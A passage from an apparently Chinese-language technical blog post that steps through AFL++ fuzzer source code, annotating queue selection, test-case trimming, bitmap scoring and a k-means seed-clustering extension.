ACTF(<span class="hljs-string">&quot;Entering queue cycle %llu.&quot;</span>, afl-&gt;queue_cycle);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>这个语句会先判断<code>afl-&gt;not_on_tty</code>，也就是当其值为true时，表示AFL++不是在tty终端上运行。在环境变量AFL_NO_UI的值，如果为真，则设置<code>not_on_tty</code>为true.</p></blockquote><p>本次由于在调试环境，因此也没有开启UI，所以此值为1，进入执行体，将输出当前周期。接下来是一个大的if语句。外层循环如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 如果整个队列循环结束后都没有发现新的测试用例，那么接下来尝试使用重组策略。</span><br><span class="hljs-keyword">if</span> (unlikely(afl-&gt;queued_items == prev_queued<br>             <span class="hljs-comment">/* FIXME TODO <span class="hljs-doctag">BUG:</span> &amp;&amp; (get_cur_time() - afl-&gt;start_time) &gt;= 3600 */</span><br>             ))<br><span class="hljs-comment">// 这个判断条件即是，如果当前队列项（种子池中的种子数量）== 先前队列项。那么进入执行体。</span><br></code></pre></td></tr></table></figure><p>由于这是第一次执行，因此<code>pre_queued</code>的值为0，而初始种子数量为2，当前<code>afl-&gt;queued_items</code>为2。因此会跳过这个if。来到else部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> &#123;<br><br>        afl-&gt;cycles_wo_finds = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 即一个完整的队列周期内发现了新的测试用例，则将`cycles_wo_finds`计数器置0</span><br></code></pre></td></tr></table></figure><p>接下来是判断<code>cycle_schedules,          /* cycle power schedules?      */</code>，其值为0；那么跳过这个执行体。跳过能量调度策略的选择。</p><p>这个大if的执行体最后一个语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 将当前种子池的种子数量赋给prev_queued，用来判断下次循环时，是否生成新的测试用例。</span><br>prev_queued = afl-&gt;queued_items;<br></code></pre></td></tr></table></figure><p>跳出if后，执行<code>++runs_in_current_cycle;</code>这个runs_in_current_cycle的值初始化为<code>(u32)-1</code>，那么经过加1后，变成了<code>0</code>。</p><p>接下来是一个<code>do-while</code>循环体。第一段代码为一个if判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 检查是否使用旧的种子选择策略。      </span><br><span class="hljs-keyword">if</span> (likely(!afl-&gt;old_seed_selection)) &#123;<br>    <span class="hljs-comment">// 如果有新的测试实例，或者需要重新初始化alias 表。</span><br>    <span class="hljs-keyword">if</span> (unlikely(prev_queued_items &lt; afl-&gt;queued_items || afl-&gt;reinit_table)) &#123;<br>        <span class="hljs-comment">// we have new queue entries since the last run, recreate alias table</span><br>        prev_queued_items = afl-&gt;queued_items; <span class="hljs-comment">// 更新prev_queued_items</span><br>        create_alias_table(afl); <span class="hljs-comment">// 新建alias_table</span><br>    &#125;<br>    <span class="hljs-comment">// 选择下一个队列条目</span><br>    afl-&gt;current_entry = select_next_queue_entry(afl);<br>    <span class="hljs-comment">// 更新当前队列条目指针</span><br>    afl-&gt;queue_cur = afl-&gt;queue_buf[afl-&gt;current_entry];<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>select_next_queue_entry</code>是一个内联函数，用于从队列中选择下一个条目。它使用了一种称为别名方法(alias method)的算法来实现快速选择。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* select next queue entry based on alias algo - fast! */</span><br><span class="hljs-keyword">inline</span> u32 <span class="hljs-title function_">select_next_queue_entry</span><span class="hljs-params">(<span class="hljs-type">afl_state_t</span> *afl)</span> &#123;<br><span class="hljs-comment">// 生成一个在[0,afl-&gt;queue_items-1]范围内的随机数s，表示初步选择的队列条目索引。</span><br>u32    s = rand_below(afl, afl-&gt;queued_items);<br><span class="hljs-comment">// 生成一个在[0.0, 1.0]范围内的随机浮点数p，表示一个随机概率。</span><br><span class="hljs-type">double</span> p = rand_next_percent(afl);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">fprintf(stderr, &quot;select: p=%f s=%u ... p &lt; prob[s]=%f ? s=%u : alias[%u]=%u&quot;</span><br><span class="hljs-comment">&quot; ==&gt; %u\n&quot;, p, s, afl-&gt;alias_probability[s], s, s, afl-&gt;alias_table[s], p &lt;</span><br><span class="hljs-comment">afl-&gt;alias_probability[s] ? s : afl-&gt;alias_table[s]);</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// afl-&gt;alias_probability[s]这是一个概率数组，存储了每个条目的选择概率。</span><br><span class="hljs-comment">// afl-&gt;alias_table[s]这是一个别名数组，存储了每个条目的别名索引</span><br><span class="hljs-comment">// 如果随机概率p小于s条目的选择概率，则返回s；否则返回s条目的别名索引</span><br><span class="hljs-keyword">return</span> (p &lt; afl-&gt;alias_probability[s] ? s : afl-&gt;alias_table[s]);<br><br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>随后进入fuzzing函数<code>fuzz_one_original(afl)</code>，这个函数是afl-fuzz-one.c中的函数。这个函数很长…</p><p>执行完一些变量的初始化后，来到该函数的第一个if判断：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// afl-&gt;custom_mutators_count 是一个整数变量，用于记录用户自定义变异器的数量。</span><br><span class="hljs-keyword">if</span>(unlikely(afl-&gt;custom_mutators_count))&#123;<br><span class="hljs-comment">/* The custom mutator will decide to skip this test case or not. */</span><br>LIST_FOREACH(&amp;afl-&gt;custom_mutator_list, <span class="hljs-keyword">struct</span> custom_mutator, &#123;<br>    <span class="hljs-keyword">if</span> (el-&gt;afl_custom_queue_get &amp;&amp;<br>        !el-&gt;afl_custom_queue_get(el-&gt;data, afl-&gt;queue_cur-&gt;fname)) &#123;<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    &#125;<br><br>  &#125;);<br>&#125;<br><span class="hljs-comment">// 本次执行没有custom_mutators，因此会跳过这个执行体。</span><br></code></pre></td></tr></table></figure><p>接下来就是第二个if判断<code>pending_favored,          /* Pending favored paths </code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// afl-&gt;pending_favored用于统计当前待处理的优先测试用例数量，也就是favored的还未测试的测试用例数量，这里为2。</span><br><span class="hljs-keyword">if</span> (likely(afl-&gt;pending_favored)) &#123;<br><br>    <span class="hljs-comment">/* If we have any favored, non-fuzzed new arrivals in the queue,</span><br><span class="hljs-comment">       possibly skip to them at the expense of already-fuzzed or non-favored</span><br><span class="hljs-comment">       cases. */</span><br><span class="hljs-comment">// afl-&gt;queue_cur-&gt;fuzz_level:当前条目的模糊迭代次数。如果这个值为非零，表示该条目已经被模糊测试过。</span><br>    <span class="hljs-comment">// afl-&gt;queue_cur-&gt;favored:当前队列条目是否为优先。如果这个值为真，表示该条目是优先条目。</span><br>    <span class="hljs-comment">// 生成一个0-99的整数，并检查它是否小于SKIP_TO_NEW_PROB(这个宏指跳到新条目的概率)</span><br>    <span class="hljs-keyword">if</span> ((afl-&gt;queue_cur-&gt;fuzz_level || !afl-&gt;queue_cur-&gt;favored) &amp;&amp;<br>        likely(rand_below(afl, <span class="hljs-number">100</span>) &lt; SKIP_TO_NEW_PROB)) &#123;<br>        <br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><br>    &#125;<br><br>  &#125;<br></code></pre></td></tr></table></figure><p>这个if的逻辑是，如果当前条目已经被模糊测试过，或者（当前条目不是优先条目，且生成的随机数小于SKIP_TO_NEW_PROB），则返回1，表示跳过当前条目，可能跳到一个新的优先条目。在本次执行中，<code>afl-&gt;queue_cur-&gt;fuzz_level</code>为0，且当前队列条目为优先。会跳过这个if。跳过后，没有其他语句，上一层<code>if (likely(afl-&gt;pending_favored))</code>便也结束了。</p><p>接下来，来到<code>if(unlikely(afl-&gt;not_on_tty))</code>判断，也就是继续往终端输出一些信息了。</p><p>信息输入完成后，执行语句<code>orig_in = in_buf = queue_testcase_get(afl, afl-&gt;queue_cur);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">inline</span> u8 *<span class="hljs-title function_">queue_testcase_get</span><span class="hljs-params">(<span class="hljs-type">afl_state_t</span> *afl, <span class="hljs-keyword">struct</span> queue_entry *q)</span> &#123;<br>    <span class="hljs-comment">// 保存队列条目q的长度</span><br>    u32 len = q-&gt;len;<br>    <span class="hljs-comment">/* first handle if no testcase cache is configured */</span><br>    <span class="hljs-comment">// afl-&gt;q_testcase_max_cache_size表示测试用例缓存的最大大小。如果未配置缓存（即为0），则进入这个分支。</span><br>    <span class="hljs-keyword">if</span> (unlikely(!afl-&gt;q_testcase_max_cache_size)) &#123;<br>        <span class="hljs-comment">// buf:用于存储测试用例数据的缓冲区指针</span><br>        u8 *buf;<br>        <span class="hljs-comment">// 如果当前队列条目是afl-&gt;queue_cur，则重新分配afl-&gt;testcase_buf</span><br>        <span class="hljs-keyword">if</span> (unlikely(q == afl-&gt;queue_cur)) &#123;<br>            <span class="hljs-comment">// testcase_buf用于存储当前测试用例数据</span><br>            buf = afl_realloc((<span class="hljs-type">void</span> **)&amp;afl-&gt;testcase_buf, len);<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 否则，重新分配afl-&gt;splicecase_buf</span><br>            <span class="hljs-comment">// splicecase_buf用于 存储拼接后的测试用例数据</span><br>            buf = afl_realloc((<span class="hljs-type">void</span> **)&amp;afl-&gt;splicecase_buf, len);<br>        &#125;<br>        <span class="hljs-comment">// 检查内存是否分配成功</span><br>        <span class="hljs-keyword">if</span> (unlikely(!buf)) &#123;<br>            PFATAL(<span class="hljs-string">&quot;Unable to malloc &#x27;%s&#x27; with len %u&quot;</span>, q-&gt;fname, len);<br>    &#125;<br>    <span class="hljs-comment">// 打开文件并读取数据</span><br>    <span class="hljs-type">int</span> fd = open(q-&gt;fname, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (unlikely(fd &lt; <span class="hljs-number">0</span>)) &#123; PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, q-&gt;fname); &#125;<br>    <span class="hljs-comment">// 从文件描述符fd中取len字节的数据到缓冲区buf中</span><br>    ck_read(fd, buf, len, q-&gt;fname);<br>    close(fd);<br>    <span class="hljs-keyword">return</span> buf;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是记录当前队列的长度<code>len = afl-&gt;queue_cur-&gt;len</code>；随后给out_buf 分配len长度的空间。</p><p>再重置<code>afl-&gt;subseq_tmouts=0</code>；subseq_tmouts的值记录着连续超时的次数。如果一个测试用例运行超时，计数器会增加。</p><p><code>afl-&gt;cur_depth = afl-&gt;queue_cur-&gt;depth;</code>afl-&gt;cur_depth这个成员变量表示当前测试用例在输入队列中的深度。而afl-&gt;queue_cur-&gt;depth是当前队列条目的深度，每个队列条目代表一个测试用例，depth表示该测试用例在输入队列中的深度。当前执行的测试用例的深度赋值给afl的全局变量，为后续测试方便使用这个深度信息。</p><p>接下来是一个if语句<code>if (unlikely(afl-&gt;queue_cur-&gt;cal_failed))</code>，对于成员变量<code>afl-&gt;queue_cur-&gt;cal_failed</code>，其中<code>afl-queue_cur</code>是一个指向当前正在处理的队列条目的指针。每个队列条目代表一个测试用例。cal_failed是一个布尔类型成员变量，用于指示当前测试用例的校准是否失败。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> (unlikely(afl-&gt;queue_cur-&gt;cal_failed)) &#123;<br>   <span class="hljs-comment">// 初始化一个变量res为FSRV_RUN_TMOUT，表示运行超时</span><br>   u8 res = FSRV_RUN_TMOUT;<br>   <span class="hljs-comment">// 检查校准失败的次数是否小于预定义的阈值CAL_CHANCES</span><br>   <span class="hljs-keyword">if</span> (afl-&gt;queue_cur-&gt;cal_failed &lt; CAL_CHANCES) &#123;<br><span class="hljs-comment">// 如果失败次数小于阈值，则将当前队列项的执行校验和重置</span><br>     afl-&gt;queue_cur-&gt;exec_cksum = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 调用calibrate_case函数重新校准，将结果存在res中。</span><br>     res =<br>         calibrate_case(afl, afl-&gt;queue_cur, in_buf, afl-&gt;queue_cycle - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 如果再次校准失败，则报错。</span><br>     <span class="hljs-keyword">if</span> (unlikely(res == FSRV_RUN_ERROR)) &#123;<br><br>       FATAL(<span class="hljs-string">&quot;Unable to execute target application&quot;</span>);<br><br>     &#125;<br><br>   &#125;<br><span class="hljs-comment">// 检查是否需要停止fuzzing或者校准结果是否与afl-&gt;crash_mode一致。</span><br>   <span class="hljs-keyword">if</span> (unlikely(afl-&gt;stop_soon) || res != afl-&gt;crash_mode) &#123;<br><span class="hljs-comment">// 增加跳过测试实例数量</span><br>     ++afl-&gt;cur_skipped_items;<br>   <span class="hljs-comment">// 跳转到abandon_entry标签</span><br>     <span class="hljs-keyword">goto</span> abandon_entry;<br><br>   &#125;<br><br> &#125;<br></code></pre></td></tr></table></figure><p>随后是“修剪”操作，接下来的if语句判断是否需要对当前队列进行修剪操作。修剪操作用于减少输入的大小，同时保持其有效性，以提高模糊测试效率。以下对这个if语句进行详细解释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// afl-&gt;non_instrumented_mode 为1表示处于非插桩模式，0表示处于插桩模式</span><br><span class="hljs-comment">// afl-&gt;queue_cur-&gt;trim_done 为1表示当前队列项已经完成修剪，0表示未完成</span><br><span class="hljs-comment">// afl-&gt;disable_trim 为1表示禁用修剪操作，0表示启用修剪操作</span><br><span class="hljs-keyword">if</span> (unlikely(!afl-&gt;non_instrumented_mode &amp;&amp; !afl-&gt;queue_cur-&gt;trim_done &amp;&amp;<br>               !afl-&gt;disable_trim)) &#123;<br><span class="hljs-comment">// 当前模式是插桩模式，当前队列项没有完成修剪，修剪操作是启用状态，则执行循环体。</span><br>    <span class="hljs-comment">// 保存当前队列项的长度（当前测试实例的长度）</span><br>    u32 old_len = afl-&gt;queue_cur-&gt;len;<br><span class="hljs-comment">// 调用trim_case函数执行修剪操作，下面有对trim_case的详细说明</span><br>    u8 res = trim_case(afl, afl-&gt;queue_cur, in_buf);<br>    orig_in = in_buf = queue_testcase_get(afl, afl-&gt;queue_cur);<br><br>    <span class="hljs-keyword">if</span> (unlikely(res == FSRV_RUN_ERROR)) &#123;<br><br>      FATAL(<span class="hljs-string">&quot;Unable to execute target application&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (unlikely(afl-&gt;stop_soon)) &#123;<br><br>      ++afl-&gt;cur_skipped_items;<br>      <span class="hljs-keyword">goto</span> abandon_entry;<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Don&#x27;t retry trimming, even if it failed. */</span><br><br>    afl-&gt;queue_cur-&gt;trim_done = <span class="hljs-number">1</span>;<br><br>    len = afl-&gt;queue_cur-&gt;len;<br><br>    <span class="hljs-comment">/* maybe current entry is not ready for splicing anymore */</span><br>    <span class="hljs-comment">// 如果当前测试实例的长度小于或等于4并且修剪前的长度大于4，那么，当前条目不进行拼接变异。</span><br>    <span class="hljs-keyword">if</span> (unlikely(len &lt;= <span class="hljs-number">4</span> &amp;&amp; old_len &gt; <span class="hljs-number">4</span>)) --afl-&gt;ready_for_splicing_count;<br><br>  &#125;<br></code></pre></td></tr></table></figure><blockquote><p>如何进行“修剪”操作？trim_case函数做了什么？</p><p>trim_case函数很长，大概步骤如下：</p><ol><li><p>保存原始长度</p></li><li><p>自定义变异器修剪</p><p>如果，<code>afl-&gt;custom_mutators_count&gt;=1</code>则尝试使用用户自定义的变异器进行修剪。如果修剪成功，返回修剪结果。</p><p>trimmed_case用于存储修剪结果，custom_trimmed用于标记是否进行了自定义变异器修剪。随后遍历自定义变异器列表，检查并调用自定义修剪函数trim_case_custom。</p><p>这里就是对于每个自定义变异器，检查其是否实现了afl_custom_trim函数，如果实现了，调用trim_case_custom函数进行修剪，并将结果存储在trimmed_case中，同时将custom_trimmed标记为true。然后，如果自定义变异器的修剪成功，恢复原始测试用例，返回修剪结果。</p></li><li><p>处理初始种子长度小于5的情况</p><p>对满足条件的种子，为map分配空间，并初始化。为mutated_pos分配空间，并初始化。</p></li><li><p>对测试实例进行修剪</p><p>循环执行，直到<code>remove_len &gt;= MAX(len_p2 / TRIM_END_STEPS, (u32)TRIM_MIN_BYTES)</code>；其中，remove_len表示要移除的字节数，len_p2是大于等于<code>q-&gt;len</code>的最小2的幂次方。TRIM_END_STEPS是一个常量，表示修剪开始时的步长。TRIM_MIN_BYTES表示修建时的最小字节数。</p><p>随后初始化remove_pos为remove_len，表示从这个位置开始尝试删除数据。下一步进入内层循环<code>while(remove_pos &lt; q-&gt;len)</code>，进入内层循环遍历输入数据，尝试从remove_pos开始删除remove_len字节的数据。写入带有间隙的数据：<code>write_with_gap(afl, in_buf, q-&gt;len, remove_pos, trim_avail);</code>将输入数据写入目标程序，带有间隙（即删除部分的数据不写入目标程序）。再调用<code>fuzz_run_target</code>函数运行目标程序。随后检查运行结果，如果发生错误或需要停止，则跳转到<code>abort_trimming</code>标签进行放弃修剪。若正常运行，则计算执行路径的哈希值<code>cksum=hash64(afl-&gt;fsrv.trace_bits, afl-&gt;fsrv.map_size, HASH_CONST);</code>。然后使用该hash值与测试实例的hash值进行比对，如果相同，代表删除数据后的执行路径与原始路径相同，则认为删除是有效的，更新输入数据和相关信息。</p><p>随后，减少删除长度<code>remove_len &gt;&gt;= 1;</code>，每次循环结束后，进入新循环前，将remove_len减半，以便在下次循环中尝试删除更小的数据块。</p></li><li><p>修剪结束后，检查是否需要写回操作</p><p>也就是if语句的判断条件<code>needs_write</code>；如果needs_write为真，表示in_buf已经被修改，需要更新磁盘上的测试用例文件。也就是上述修剪成功后更新输入数据的操作改变in_buf。相应地，需要修改磁盘上的文件。但是这其中调用<code>update_bitmap_score</code>函数进行更新位图和得分。是为啥？</p><p>关于<code>update_bitmap_score()</code>函数逻辑作如下说明：</p><ol><li><p>首先定义三个变量</p><p><code>i</code>:用于循环遍历AFL的位图；<code>fav_factor</code>:当前路径的评分因子；<code>fuzz_p2</code>:当前路径的模糊测试优先级。</p></li><li><p>计算<code>fuzz_p2</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(afl-&gt;schedule &gt;= FAST &amp;&amp; afl-&gt;schedule &lt; RARE))<br>  fuzz_p2 = <span class="hljs-number">0</span>;  <span class="hljs-comment">// Skip the fuzz_p2 comparison</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (unlikely(afl-&gt;schedule == RARE))<br>  fuzz_p2 = next_pow2(afl-&gt;n_fuzz[q-&gt;n_fuzz_entry]);<br><span class="hljs-keyword">else</span><br>  fuzz_p2 = q-&gt;fuzz_level;<br></code></pre></td></tr></table></figure><p>根据AFL的调度策略，计算fuzz_p2。如果调度策略在FAST和RARE之间，跳过fuzz_p2比较。设置为0.如果调度策略是RARE，使用next_pow2函数计算fuzz_p2。其他所有情况下的fuzz_p2设置为<code>q-&gt;fuzz_level</code>；</p></li><li><p>计算<code>fuzz_factor</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(afl-&gt;schedule &gt;= RARE) || unlikely(afl-&gt;fixed_seed)) &#123;<br>  fav_factor = q-&gt;len &lt;&lt; <span class="hljs-number">2</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  fav_factor = q-&gt;exec_us * q-&gt;len;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据调度策略和是否使用固定种子（<code>afl-&gt;fixed_seed</code>），计算<code>fav_factor</code>。如果调度策略是RARE或使用固定种子，fav_factor为<code>q-&gt;len &lt;&lt; 2</code>。其他所有情况下的fav_factor设置为<code>q-&gt;exec_us * q-&gt;len</code>。</p></li><li><p>for循环遍历<code>afl-&gt;fsrv.trace_bits</code>数组</p><p>遍历<code>trace_bits</code>数组，当满足<code>trace_bits[i]&gt;=1</code>时，也就是这条分支被覆盖了。当满足<code>afl-&gt;top_rated[i]&gt;=1</code>时，执行接下来的执行体：根据<code>afl-&gt;schedule</code>和<code>afl-&gt;fixed_seed</code>的值计算<code>top_rated_fav_factor</code>和<code>top_rated_fuzz_p2</code>。</p><blockquote><p>对<code>trace_bits</code>数组和<code>top_rated</code>数组作如下解释：</p><ul><li>trace_bits数组的每一位对应一个分支的映射关系。其通过插桩代码来实现，具体来说，AFL的编译工具在编译被测试程序时，会在每个分支处插入代码，每个分支都有一个唯一ID，这个ID会被用来计算trace_bits数组的索引。当程序执行到某个分支时，插桩代码会更具该分支的ID计算出trace_bits数组的索引，并设置相应的位。</li><li>top_rated数组存储每个分支（路径）上最有价值的测试用例。具体来说，它记录了在模糊测试过程中，每个分支覆盖率最高或发现路径最多的测试用例。top_rated是一个指向<code>queue_entry</code>结构体的指针数组。每个数组元素对应一个分支，存储的是在该分支上最有价值的测试用例。当一个新的测试用例发现新的路径或覆盖更多的分支时，如果新的测试用例比当前存储的测试用例更有价值，AFL会将新的测试用例存储到top_rated数组中。</li></ul></blockquote><p>计算结束后，比较fuzz_p2和top_fuzz_p2的值，如果相等的话，根据<code>afl-&gt;schedule</code>和<code>afl-&gt;fixed_seed</code>的值，进一步比较<code>fav_factor</code>和<code>afl-&gt;top_rated[i]</code>的属性值。</p><p>更新top_rated[i]的trace_mini变量，将当前测试用例q插入最后插入新的top_rated，增加其引用计数。如果<code>q-&gt;trace_mini</code>为空或0，则分配内存并最小化<code>trace_bits</code>数组，最后，设置<code>afl-&gt;score_changed</code>为1.</p></li><li><p>循环结束</p></li></ol></li></ol><p>trim函数结束后，是<code>queue_testcase_get()</code>函数，这个函数的主要功能是从文件中读取测试用例，并根据是否配置了缓存来决定是直接读取还是从缓存中读取。如果缓存已经满，则会驱逐一个旧的缓存条目以腾出空间。</p></blockquote><p>随后来到<code>afl-&gt;queue_cur-&gt;trim_done=1;</code>表明当前队列条目已经完成修剪，无论其是否修剪成功，不再执行修剪。至此，修剪的第一个if语句结束。</p><p><code>memcpy(out_buf, in_buf, len);</code>将in_buf中长度为len的内容复制到out_buf中。</p><p><code> u64 fuzz_time = ((afl-&gt;prev_run_time + get_cur_time() - afl-&gt;start_time) / 1000);</code>计算fuzz_time。</p><p>随后，执行以下语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 如果队列中的种子数量大于中心种子数量，并且队列中的种子数量大于等于两倍的中心相关种子数量</span><br><span class="hljs-keyword">if</span>(afl-&gt;queued_items &gt; afl-&gt;centers_num &amp;&amp; (afl-&gt;queued_items &gt;= <span class="hljs-number">2</span> * afl-&gt;last_centers_realted_seeds))&#123;<br>    <span class="hljs-comment">// 执行kmeans_main函数，进行聚类分析</span><br>    kmeans_main(afl);<br><span class="hljs-comment">// 更新中心相关种子为当前队列中的种子数量</span><br>    afl-&gt;last_centers_realted_seeds = afl-&gt;queued_items;<br>    <span class="hljs-comment">// 更新中心相关种子生成时间为当前模糊测试时间</span><br>    afl-&gt;centers_gen_time = fuzz_time;<br><span class="hljs-comment">// 遍历队列中的每个种子</span><br>    <span class="hljs-keyword">for</span> (u32 c = <span class="hljs-number">0</span>; c &lt; afl-&gt;queued_items; c++) &#123;<br>        <span class="hljs-comment">// queue_buf存储模糊测试队列中的所有条目，它是一个动态增长的数组，可以根据需要增加大小。</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span> * <span class="hljs-title">cur_node</span> =</span> afl-&gt;queue_buf[c];<br>        <span class="hljs-comment">// 如果当前种子的初始种子存在并且当前种子经过变异。</span><br>      <span class="hljs-keyword">if</span>(cur_node-&gt;initial_seed &amp;&amp; cur_node-&gt;mutated_pos_num != <span class="hljs-number">-1</span>)&#123;<br>          <span class="hljs-comment">// 那么变异当前种子的每一个字节</span><br>        <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; cur_node-&gt;len;i++)&#123;<br>            <span class="hljs-comment">// 判断当前种子第i个字节是否发生变异</span><br>          <span class="hljs-keyword">if</span>(cur_node-&gt;mutated_pos[i].flag &gt;= <span class="hljs-number">1</span>)&#123;<br>              <span class="hljs-comment">// 如果发生变异，则释放该字节的A和b矩阵（这是CMAB中的内容）</span><br>            M_free(cur_node-&gt;mutated_pos[i].A);<br>            M_free(cur_node-&gt;mutated_pos[i].b);<br>  <span class="hljs-comment">// 重新分配A,b的资源</span><br>              <span class="hljs-comment">// 